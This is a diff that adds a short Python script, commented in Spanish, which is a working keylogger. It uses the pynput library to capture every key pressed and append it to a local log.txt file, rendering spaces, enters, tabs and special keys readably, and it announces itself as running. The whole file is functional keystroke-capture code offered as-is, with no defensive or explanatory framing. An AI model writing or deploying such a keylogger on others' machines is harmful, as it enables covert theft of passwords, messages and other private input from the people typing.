@@ -1,0 +1,28 @@
+from pynput.keyboard import Listener
+
+# Función para registrar las teclas presionadas
+def log_key(key):
+    key = str(key).replace("'", "")  # Elimina las comillas simples
+    with open("log.txt", "a") as log_file:
+        if key == "Key.space":
+            log_file.write(" ")  # Registra un espacio en vez de "Key.space"
+        elif key == "Key.enter":
+            log_file.write("\n")  # Nueva línea para "Key.enter"
+        elif key == "Key.backspace":
+            log_file.write("[BACKSPACE]")  # Marca cuando se presiona el Backspace
+        elif key == "Key.tab":
+            log_file.write("\t")  # Registra un tabulador
+        elif "Key" in key:
+            log_file.write(f"[{key}]")  # Para cualquier otra tecla especial
+        else:
+            log_file.write(key)  # Para letras y números
+
+# Función principal para iniciar el listener
+def start_keylogger():
+    print("[+] Keylogger en ejecución...")
+    # Inicia el listener del teclado
+    with Listener(on_press=log_key) as listener:
+        listener.join()  # Mantiene el listener activo
+
+if __name__ == "__main__":
+    start_keylogger()
